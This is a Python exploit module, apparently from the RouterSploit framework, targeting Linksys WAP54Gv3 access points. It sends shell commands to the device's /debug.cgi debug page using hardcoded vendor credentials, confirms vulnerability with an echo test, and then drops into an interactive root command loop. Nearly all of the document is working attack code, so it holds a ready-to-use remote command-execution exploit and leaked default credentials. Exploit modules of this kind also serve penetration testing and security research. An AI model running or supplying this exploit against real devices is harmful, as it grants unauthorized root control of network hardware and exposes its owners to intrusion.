# rsf exploit module
# description: Module exploits remote command execution in Linksys WAP54Gv3 devices. Debug interface allows executing root privileged shell commands is available on dedicated web pages on the device.

import requests
import re

class Exploit:
    __info__ = {
        "name": "Linksys WAP54Gv3",
        "description": "Module exploits remote command execution in Linksys WAP54Gv3 devices. "
                       "Debug interface allows executing root privileged shell commands is available "
                       "on dedicated web pages on the device.",
        "authors": (
            "Phil Purviance",  
            "Marcin Bury",  
        ),
        "references": (
            "http://seclists.org/bugtraq/2010/Jun/93",
        ),
        "devices": (
            "Linksys WAP54Gv3",
        )
    }

    def __init__(self, target):
        self.target = target

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
            self.shell()
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        data = {"data1": cmd, "command": "ui_debug"}
        response = requests.post(self.target + "/debug.cgi", data=data, auth=("Gemtek", "gemtekswd"))
        res = re.findall('<textarea rows=30 cols=100>(.+?)</textarea>', response.text, re.DOTALL)
        if res:
            return res[0]
        return ""

    def check(self):
        mark = "randomtext"
        cmd = "echo {}".format(mark)
        response = self.execute(cmd)
        if mark in response:
            return True
        return False

    def shell(self):
        while True:
            cmd = input("Shell> ")
            if cmd == "exit":
                break
            result = self.execute(cmd)
            print(result)

